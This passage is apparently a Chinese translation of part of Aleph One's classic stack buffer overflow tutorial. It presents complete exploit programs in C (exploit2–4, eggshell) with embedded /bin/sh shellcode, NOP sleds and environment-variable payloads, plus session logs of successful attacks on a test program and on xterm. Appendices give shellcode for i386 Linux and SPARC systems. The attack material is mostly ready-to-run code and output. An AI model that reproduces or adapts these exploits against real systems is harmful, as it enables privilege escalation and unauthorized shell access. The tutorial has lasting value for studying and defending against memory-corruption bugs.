我们创建一个程序可以接受两个参数, 一是缓冲区大小, 二是从其自身堆栈指针算起的偏移量(这个堆栈指针指明了我们想要使其溢出的缓冲区所在的位置). 我们把溢出字符串放到一个环境变量中, 这样就容易操作一些.

exploit2.c

```c
#include

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512

char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
    char *buff, *ptr;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;

    int i;

    if (argc > 1) bsize = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);

    if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    printf("Using address: 0x%x\n", addr);

    ptr = buff;
    addr_ptr = (long *) ptr;
    for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

    ptr += 4;
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

    buff[bsize - 1] = '\0';

    memcpy(buff,"EGG=",4);
    putenv(buff);
    system("/bin/bash");
}
```

现在我们尝试猜测缓冲区的大小和偏移量:

```
[aleph1]$ ./exploit2 500
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
[aleph1]$ exit
[aleph1]$ ./exploit2 600
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
Illegal instruction
[aleph1]$ exit
[aleph1]$ ./exploit2 600 100
Using address: 0xbffffd4c
[aleph1]$ ./vulnerable $EGG
Segmentation fault
[aleph1]$ exit
[aleph1]$ ./exploit2 600 200
Using address: 0xbffffce8
[aleph1]$ ./vulnerable $EGG
Segmentation fault
[aleph1]$ exit
.
.
.
[aleph1]$ ./exploit2 600 1564
Using address: 0xbffff794
[aleph1]$ ./vulnerable $EGG
$
```

正如我们所看到的, 这并不是一个很有效率的过程. 即使知道了堆栈的起始地址, 尝试猜测偏移量也几乎是不可能的. 我们很可能要试验几百次, 没准几千次也说不定. 问题的关键在于我们必须*确切*地知道我们代码开始的地址. 如果偏差哪怕只有一个字节我们也只能得到段错误或非法指令错误. 提高成功率的一种方法是在我们溢出缓冲区的前段填充NOP指令. 几乎所有的处理器都有NOP指令执行空操作. 常用于延时目的. 我们利用它来填充溢出缓冲区的前半段. 然后把shellcode放到中段, 之后是返回地址. 如果我们足够幸运的话, 返回地址指到NOPs字串的任何位置, NOP指令就会执行, 直到碰到我们的shellcode. 在Intel体系结构中NOP指令只有一个字节长, 翻译为机器码是`0x90`. 假定堆栈的起始地址是`0xFF`, `S`代表shellcode, `N`代表NOP指令, 新的堆栈看起来是这样:

```
内存低地址                                       内存高地址
+----------------------+------+------+------+------+------+
| DDDDDDDDEEEEEEEEEEEE | EEEE | FFFF | FFFF | FFFF | FFFF |
+----------------------+------+------+------+------+------+
| 89ABCDEF0123456789AB | CDEF | 0123 | 4567 | 89AB | CDEF |
+----------------------+------+------+------+------+------+
|       buffer         | sfp  | ret  |  a   |  b   |  c   |
+----------------------+------+------+------+------+------+
| NNNNNNNNNNNSSSSSSSSS | 0xDE | 0xDE | 0xDE | 0xDE | 0xDE |
+----------------------+------+------+------+------+------+
  ↑                             |
  +-----------------------------+
堆栈顶部                                           堆栈底部
```

新的破解程序如下:

exploit3.c

```c
#include

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define NOP 0x90

char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
    char *buff, *ptr;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;

    int i;

    if (argc > 1) bsize = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);

    if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    printf("Using address: 0x%x\n", addr);

    ptr = buff;
    addr_ptr = (long *) ptr;
    for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

    for (i = 0; i < bsize/2; i++)
        buff[i] = NOP;

    ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

    buff[bsize - 1] = '\0';

    memcpy(buff,"EGG=",4);
    putenv(buff);
    system("/bin/bash");
}
```

我们所使用的缓冲区大小最好比要使其溢出的缓冲区大100字节左右. 我们在要使其溢出的缓冲区尾部放置shellcode, 为NOP指令留下足够的空间, 仍然使用我们推测的地址来覆盖返回地址. 这里我们要使其溢出的缓冲区大小是512字节, 所以我们使用612字. 现在使用新的破解程序来使我们的测试程序溢出:

```
[aleph1]$ ./exploit3 612
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
$
```

哇!一击中的!这个改进成千倍地提高了我们的命中率. 下面在真实的环境中尝试一下缓冲区溢出. 在Xt库上运用我们所讲述的方法. 在例子中, 我们使用xterm(实际上所有连接Xt库的程序都有漏洞). 计算机上要运行X Server并且允许本地的连接. 还要相应设置`DISPLAY`变量.


```
[aleph1]$ export DISPLAY=:0.0
[aleph1]$ ./exploit3 1124
Using address: 0xbffffdb4
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name "^1FF

(此处截断多行输出)

^C
[aleph1]$ exit
[aleph1]$ ./exploit3 2148 100
Using address: 0xbffffd48
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name "^1FF

(此处截断多行输出)

Warning: some arguments in previous message were lost
Illegal instruction
[aleph1]$ exit
.
.
.
[aleph1]$ ./exploit4 2148 600
Using address: 0xbffffb54
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name "^1FF

(此处截断多行输出)

Warning: some arguments in previous message were lost
bash$
```

尤里卡! 仅仅几次尝试我们就成功了!如果xterm是带suid root安装的, 我们就已经
得到了一个root shell了.

## 小缓冲区的溢出

有时候想使其溢出的缓冲区太小了, 以至于shellcode都放不进去, 这样返回地址就会被指令所覆盖, 而不是我们所推测的地址, 或者shellcode是放进去了, 但是没法填充足够多的NOP指令, 这样推测地址的成功率就很低了. 要从这样的程序(小缓冲区)里得到一个shell, 我们必须得想其他办法. 下面介绍的这种方法只在能够访问程序的环境变量时有效.

我们所做的就是把shellcode放到环境变量中去, 然后用这个变量在内存中的地址来使缓冲区溢出. 这种方法同时也提高了破解工作的成功率, 因为保存shellcode的环境变量想要多大就有多大.


当程序开始时, 环境变量存储在堆栈的顶部, 任何使用`setenv()`的修改动作会在其他地方重新分配空间. 开始时的堆栈如下所示:

```
NULLNULL
```

我们新的程序会使用一个额外的变量, 变量的大小能够容纳shellcode和NOP指令,新的破解程序如下所示:


exploit4.c

```c
#include

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90

char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
    __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
    char *buff, *ptr, *egg;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
    int i, eggsize=DEFAULT_EGG_SIZE;

    if (argc > 1) bsize = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);
    if (argc > 3) eggsize = atoi(argv[3]);


    if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }
    if (!(egg = malloc(eggsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }

    addr = get_esp() - offset;
    printf("Using address: 0x%x\n", addr);

    ptr = buff;
    addr_ptr = (long *) ptr;
    for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

    ptr = egg;
    for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
        *(ptr++) = NOP;

    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

    buff[bsize - 1] = '\0';
    egg[eggsize - 1] = '\0';

    memcpy(egg,"EGG=",4);
    putenv(egg);
    memcpy(buff,"RET=",4);
    putenv(buff);
    system("/bin/bash");
}
```

用这个新的破解程序来试试我们的漏洞测试程序:

```

[aleph1]$ ./exploit4 768
Using address: 0xbffffdb0
[aleph1]$ ./vulnerable $RET
$
```

成功了, 再试试xterm:

```
[aleph1]$ export DISPLAY=:0.0
[aleph1]$ ./exploit4 2148
Using address: 0xbffffdb0
[aleph1]$ /usr/X11R6/bin/xterm -fg $RET
Warning: Color name

(此处截断多行输出)

Warning: some arguments in previous message were lost
$
```

一次成功! 它显著提高了我们的成功率. 依赖于破解程序和被破解程序比较环境数据的多少, 我们推测的地址可能高也可能低于真值. 正和负的偏移量都可以试一试.


## 寻找缓冲区溢出漏洞

如前所述, 缓冲区溢出是向一个缓冲区填充超过其处理能力的信息造成的结果. 由于C语言没有任何内置的边界检查, 写入一个字符数组时, 如果超越了数组的结尾就会造成溢出. 标准C语言库提供了一些没有边界检查的字符串复制或添加函数. 包括`strcat()`, `strcpy()`, `sprintf()`, 和`vsprintf()`. 这些函数对一个`null`结尾的字符串进行操作, 并不检查溢出情况. `gets()`函数从标准输入中读取一行到缓冲区中, 直到换行或EOF. 它也不检查缓冲区溢出. `scanf()`函数族在匹配一系列非空格字符(`%s`), 或从指定集合(`%[]`)中匹配非空系列字符时, 使用字符指针指向数组, 并且没有定义最大字段宽度这个可选项, 就可能出现问题. 如果这些函数的目标地址是一个固定大小的缓冲区, 函数的另外参数是由用户以某种形式输入, 则很有可能利用缓冲区溢出来破解它.


另一种常见的编程结构是使用`while`循环从标准输入或某个文件一次将一个字符读取到缓冲区中, 直到行尾或文件结尾, 或者碰到别的什么终止符. 这种结构通常使用`getc()`, `fgetc()`, 或`getchar()`函数中的某一个. 如果在`while`循环中没有明确的溢出检查, 这种程序就很容易被破解.


由此可见, `grep(1)`是一个很好的工具命令(帮助你找到程序中可能有的漏洞). 自由操作系统及其工具的源码是可读的. 当你意识到其实很多商业操作系统工具都和自由软件有着相同的源码时,剩下的事情就简单了! :-)



## 附录 A - 不同操作系统/体系结构的shellcode

i386/Linux

```
jmp 0x1f
popl %esi
movl %esi,0x8(%esi)
xorl %eax,%eax
movb %eax,0x7(%esi)
movl %eax,0xc(%esi)
movb xb,%al
movl %esi,%ebx
leal 0x8(%esi),%ecx
leal 0xc(%esi),%edx
int x80
xorl %ebx,%ebx
movl %ebx,%eax
inc %eax
int x80
call -0x24
.string \"/bin/sh\"
```

SPARC/Solaris

```
sethi 0xbd89a, %l6
or %l6, 0x16e, %l6
sethi 0xbdcda, %l7
and %sp, %sp, %o0
add %sp, 8, %o1
xor %o2, %o2, %o2
add %sp, 16, %sp
std %l6, [%sp - 16]
st %sp, [%sp - 8]
st %g0, [%sp - 4]
mov 0x3b, %g1
ta 8
xor %o7, %o7, %o0
mov 1, %g1
ta 8
```

SPARC/SunOS

```
sethi 0xbd89a, %l6
or %l6, 0x16e, %l6
sethi 0xbdcda, %l7
and %sp, %sp, %o0
add %sp, 8, %o1
xor %o2, %o2, %o2
add %sp, 16, %sp
std %l6, [%sp - 16]
st %sp, [%sp - 8]
st %g0, [%sp - 4]
mov 0x3b, %g1
mov -0x1, %l5
ta %l5 + 1
xor %o7, %o7, %o0
mov 1, %g1
ta %l5 + 1
```


## 附录 B - 通用缓冲区溢出程序

shellcode.h

```c
#if defined(__i386__) && defined(__linux__)

#define NOP_SIZE 1
char nop[] = "\x90";
char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
}

#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)

#define NOP_SIZE 4
char nop[]="\xac\x15\xa1\x6e";
char shellcode[] =
    "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
    "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
    "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
    "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";

unsigned long get_sp(void) {
    __asm__("or %sp, %sp, %i0");
}

#elif defined(__sparc__) && defined(__sun__)

#define NOP_SIZE 4
char nop[]="\xac\x15\xa1\x6e";
char shellcode[] =
    "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
    "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
    "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
    "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";

unsigned long get_sp(void) {
    __asm__("or %sp, %sp, %i0");
}

#endif
```

eggshell.c

```
/*
 * eggshell v1.0
 *
 * Aleph One / aleph1@underground.org
 */
#include
#include
#include "shellcode.h"

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048

void usage(void);

void main(int argc, char *argv[]) {
    char *ptr, *bof, *egg;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
    int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;

    while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
        switch (c) {
            case 'a':
                align = atoi(optarg);
                break;
            case 'b':
                bsize = atoi(optarg);
                break;
            case 'e':
                eggsize = atoi(optarg);
                break;
            case 'o':
                offset = atoi(optarg);
                break;
            case '?':
                usage();
                exit(0);
        }

    if (strlen(shellcode) > eggsize) {
        printf("Shellcode is larger the the egg.\n");
        exit(0);
    }

    if (!(bof = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }
    if (!(egg = malloc(eggsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
        bsize, eggsize, align);
    printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);

    addr_ptr = (long *) bof;
    for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

    ptr = egg;
    for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
    for (n = 0; n < NOP_SIZE; n++) {
        m = (n + align) % NOP_SIZE;
        *(ptr++) = nop[m];
    }

    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

    bof[bsize - 1] = '\0';
    egg[eggsize - 1] = '\0';

    memcpy(egg,"EGG=",4);
    putenv(egg);

    memcpy(bof,"BOF=",4);
    putenv(bof);
    system("/bin/sh");
}

void usage(void) {
    (void)fprintf(stderr,
        "usage: eggshell [-a ] [-b ] [-e ] [-o ]\n");
}
```